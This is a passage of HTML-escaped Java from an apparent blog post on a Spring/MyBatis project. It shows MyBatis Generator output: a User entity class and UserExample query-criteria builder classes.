        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andNoteGreaterThanOrEqualTo(String value) {
            addCriterion(&lt;/span&gt;&quot;note &amp;gt;=&quot;, value, &quot;note&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andNoteLessThan(String value) {
            addCriterion(&lt;/span&gt;&quot;note &amp;lt;&quot;, value, &quot;note&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andNoteLessThanOrEqualTo(String value) {
            addCriterion(&lt;/span&gt;&quot;note &amp;lt;=&quot;, value, &quot;note&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andNoteLike(String value) {
            addCriterion(&lt;/span&gt;&quot;note like&quot;, value, &quot;note&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andNoteNotLike(String value) {
            addCriterion(&lt;/span&gt;&quot;note not like&quot;, value, &quot;note&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Criteria andNoteIn(List&amp;lt;String&amp;gt;&lt;span&gt; values) {
            addCriterion(&lt;/span&gt;&quot;note in&quot;, values, &quot;note&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Criteria andNoteNotIn(List&amp;lt;String&amp;gt;&lt;span&gt; values) {
            addCriterion(&lt;/span&gt;&quot;note not in&quot;, values, &quot;note&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andNoteBetween(String value1, String value2) {
            addCriterion(&lt;/span&gt;&quot;note between&quot;, value1, value2, &quot;note&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andNoteNotBetween(String value1, String value2) {
            addCriterion(&lt;/span&gt;&quot;note not between&quot;, value1, value2, &quot;note&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; Criteria &lt;span&gt;extends&lt;/span&gt;&lt;span&gt; GeneratedCriteria {

        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt;&lt;span&gt; Criteria() {
            &lt;/span&gt;&lt;span&gt;super&lt;/span&gt;&lt;span&gt;();
        }
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Criterion {
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String condition;

        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; Object value;

        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; Object secondValue;

        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; noValue;

        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; singleValue;

        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; betweenValue;

        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; listValue;

        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String typeHandler;

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getCondition() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; condition;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Object getValue() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; value;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Object getSecondValue() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; secondValue;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; isNoValue() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; noValue;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; isSingleValue() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; singleValue;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; isBetweenValue() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; betweenValue;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; isListValue() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; listValue;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getTypeHandler() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; typeHandler;
        }

        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt;&lt;span&gt; Criterion(String condition) {
            &lt;/span&gt;&lt;span&gt;super&lt;/span&gt;&lt;span&gt;();
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.condition =&lt;span&gt; condition;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.typeHandler = &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.noValue = &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt;&lt;span&gt; Criterion(String condition, Object value, String typeHandler) {
            &lt;/span&gt;&lt;span&gt;super&lt;/span&gt;&lt;span&gt;();
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.condition =&lt;span&gt; condition;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.value =&lt;span&gt; value;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.typeHandler =&lt;span&gt; typeHandler;
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (value &lt;span&gt;instanceof&lt;/span&gt; List&amp;lt;?&amp;gt;&lt;span&gt;) {
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.listValue = &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
            } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.singleValue = &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
            }
        }

        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt;&lt;span&gt; Criterion(String condition, Object value) {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;(condition, value, &lt;span&gt;null&lt;/span&gt;&lt;span&gt;);
        }

        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt;&lt;span&gt; Criterion(String condition, Object value, Object secondValue, String typeHandler) {
            &lt;/span&gt;&lt;span&gt;super&lt;/span&gt;&lt;span&gt;();
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.condition =&lt;span&gt; condition;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.value =&lt;span&gt; value;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.secondValue =&lt;span&gt; secondValue;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.typeHandler =&lt;span&gt; typeHandler;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.betweenValue = &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt;&lt;span&gt; Criterion(String condition, Object value, Object secondValue) {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;(condition, value, secondValue, &lt;span&gt;null&lt;/span&gt;&lt;span&gt;);
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;User.java&lt;/h4&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.cyb.ssm.po;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.Date;

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; User {
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; Integer id;

    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String username;

    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; Date birthday;

    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String sex;

    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String address;

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Integer getId() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; id;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setId(Integer id) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.id =&lt;span&gt; id;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getUsername() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; username;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setUsername(String username) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.username = username == &lt;span&gt;null&lt;/span&gt; ? &lt;span&gt;null&lt;/span&gt;&lt;span&gt; : username.trim();
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Date getBirthday() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; birthday;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setBirthday(Date birthday) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.birthday =&lt;span&gt; birthday;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getSex() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; sex;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setSex(String sex) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.sex = sex == &lt;span&gt;null&lt;/span&gt; ? &lt;span&gt;null&lt;/span&gt;&lt;span&gt; : sex.trim();
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getAddress() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; address;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setAddress(String address) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.address = address == &lt;span&gt;null&lt;/span&gt; ? &lt;span&gt;null&lt;/span&gt;&lt;span&gt; : address.trim();
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;UserExample.java&lt;/h4&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;202&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.cyb.ssm.po;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.ArrayList;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.Date;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.Iterator;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.List;

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; UserExample {
    &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt;&lt;span&gt; String orderByClause;

    &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; distinct;

    &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; List&amp;lt;Criteria&amp;gt;&lt;span&gt; oredCriteria;

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; UserExample() {
        oredCriteria &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; ArrayList&amp;lt;Criteria&amp;gt;&lt;span&gt;();
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setOrderByClause(String orderByClause) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.orderByClause =&lt;span&gt; orderByClause;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getOrderByClause() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; orderByClause;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; setDistinct(&lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; distinct) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.distinct =&lt;span&gt; distinct;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; isDistinct() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; distinct;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; List&amp;lt;Criteria&amp;gt;&lt;span&gt; getOredCriteria() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; oredCriteria;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; or(Criteria criteria) {
        oredCriteria.add(criteria);
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria or() {
        Criteria criteria &lt;/span&gt;=&lt;span&gt; createCriteriaInternal();
        oredCriteria.add(criteria);
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; criteria;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria createCriteria() {
        Criteria criteria &lt;/span&gt;=&lt;span&gt; createCriteriaInternal();
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (oredCriteria.size() == 0&lt;span&gt;) {
            oredCriteria.add(criteria);
        }
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; criteria;
    }

    &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt;&lt;span&gt; Criteria createCriteriaInternal() {
        Criteria criteria &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Criteria();
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; criteria;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; clear() {
        oredCriteria.clear();
        orderByClause &lt;/span&gt;= &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
        distinct &lt;/span&gt;= &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
    }

    &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;abstract&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; GeneratedCriteria {
        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; List&amp;lt;Criterion&amp;gt;&lt;span&gt; criteria;

        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt;&lt;span&gt; GeneratedCriteria() {
            &lt;/span&gt;&lt;span&gt;super&lt;/span&gt;&lt;span&gt;();
            criteria &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; ArrayList&amp;lt;Criterion&amp;gt;&lt;span&gt;();
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; isValid() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; criteria.size() &amp;gt; 0&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; List&amp;lt;Criterion&amp;gt;&lt;span&gt; getAllCriteria() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; criteria;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; List&amp;lt;Criterion&amp;gt;&lt;span&gt; getCriteria() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; criteria;
        }

        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; addCriterion(String condition) {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (condition == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
                &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; RuntimeException(&quot;Value for condition cannot be null&quot;&lt;span&gt;);
            }
            criteria.add(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Criterion(condition));
        }

        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; addCriterion(String condition, Object value, String property) {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (value == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
                &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; RuntimeException(&quot;Value for &quot; + property + &quot; cannot be null&quot;&lt;span&gt;);
            }
            criteria.add(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Criterion(condition, value));
        }

        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; addCriterion(String condition, Object value1, Object value2, String property) {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (value1 == &lt;span&gt;null&lt;/span&gt; || value2 == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
                &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; RuntimeException(&quot;Between values for &quot; + property + &quot; cannot be null&quot;&lt;span&gt;);
            }
            criteria.add(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Criterion(condition, value1, value2));
        }

        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; addCriterionForJDBCDate(String condition, Date value, String property) {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (value == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
                &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; RuntimeException(&quot;Value for &quot; + property + &quot; cannot be null&quot;&lt;span&gt;);
            }
            addCriterion(condition, &lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; java.sql.Date(value.getTime()), property);
        }

        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; addCriterionForJDBCDate(String condition, List&amp;lt;Date&amp;gt;&lt;span&gt; values, String property) {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (values == &lt;span&gt;null&lt;/span&gt; || values.size() == 0&lt;span&gt;) {
                &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; RuntimeException(&quot;Value list for &quot; + property + &quot; cannot be null or empty&quot;&lt;span&gt;);
            }
            List&lt;/span&gt;&amp;lt;java.sql.Date&amp;gt; dateList = &lt;span&gt;new&lt;/span&gt; ArrayList&amp;lt;java.sql.Date&amp;gt;&lt;span&gt;();
            Iterator&lt;/span&gt;&amp;lt;Date&amp;gt; iter =&lt;span&gt; values.iterator();
            &lt;/span&gt;&lt;span&gt;while&lt;/span&gt;&lt;span&gt; (iter.hasNext()) {
                dateList.add(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; java.sql.Date(iter.next().getTime()));
            }
            addCriterion(condition, dateList, property);
        }

        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; addCriterionForJDBCDate(String condition, Date value1, Date value2, String property) {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (value1 == &lt;span&gt;null&lt;/span&gt; || value2 == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
                &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; RuntimeException(&quot;Between values for &quot; + property + &quot; cannot be null&quot;&lt;span&gt;);
            }
            addCriterion(condition, &lt;/span&gt;&lt;span&gt;new&lt;/span&gt; java.sql.Date(value1.getTime()), &lt;span&gt;new&lt;/span&gt;&lt;span&gt; java.sql.Date(value2.getTime()), property);
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andIdIsNull() {
            addCriterion(&lt;/span&gt;&quot;id is null&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andIdIsNotNull() {
            addCriterion(&lt;/span&gt;&quot;id is not null&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andIdEqualTo(Integer value) {
            addCriterion(&lt;/span&gt;&quot;id =&quot;, value, &quot;id&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andIdNotEqualTo(Integer value) {
            addCriterion(&lt;/span&gt;&quot;id &amp;lt;&amp;gt;&quot;, value, &quot;id&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andIdGreaterThan(Integer value) {
            addCriterion(&lt;/span&gt;&quot;id &amp;gt;&quot;, value, &quot;id&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andIdGreaterThanOrEqualTo(Integer value) {
            addCriterion(&lt;/span&gt;&quot;id &amp;gt;=&quot;, value, &quot;id&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andIdLessThan(Integer value) {
            addCriterion(&lt;/span&gt;&quot;id &amp;lt;&quot;, value, &quot;id&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andIdLessThanOrEqualTo(Integer value) {
            addCriterion(&lt;/span&gt;&quot;id &amp;lt;=&quot;, value, &quot;id&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Criteria andIdIn(List&amp;lt;Integer&amp;gt;&lt;span&gt; values) {
            addCriterion(&lt;/span&gt;&quot;id in&quot;, values, &quot;id&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Criteria andIdNotIn(List&amp;lt;Integer&amp;gt;&lt;span&gt; values) {
            addCriterion(&lt;/span&gt;&quot;id not in&quot;, values, &quot;id&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andIdBetween(Integer value1, Integer value2) {
            addCriterion(&lt;/span&gt;&quot;id between&quot;, value1, value2, &quot;id&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andIdNotBetween(Integer value1, Integer value2) {
            addCriterion(&lt;/span&gt;&quot;id not between&quot;, value1, value2, &quot;id&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andUsernameIsNull() {
            addCriterion(&lt;/span&gt;&quot;username is null&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andUsernameIsNotNull() {
            addCriterion(&lt;/span&gt;&quot;username is not null&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andUsernameEqualTo(String value) {
            addCriterion(&lt;/span&gt;&quot;username =&quot;, value, &quot;username&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andUsernameNotEqualTo(String value) {
            addCriterion(&lt;/span&gt;&quot;username &amp;lt;&amp;gt;&quot;, value, &quot;username&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andUsernameGreaterThan(String value) {
            addCriterion(&lt;/span&gt;&quot;username &amp;gt;&quot;, value, &quot;username&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andUsernameGreaterThanOrEqualTo(String value) {
            addCriterion(&lt;/span&gt;&quot;username &amp;gt;=&quot;, value, &quot;username&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andUsernameLessThan(String value) {
            addCriterion(&lt;/span&gt;&quot;username &amp;lt;&quot;, value, &quot;username&quot;&lt;span&gt;);
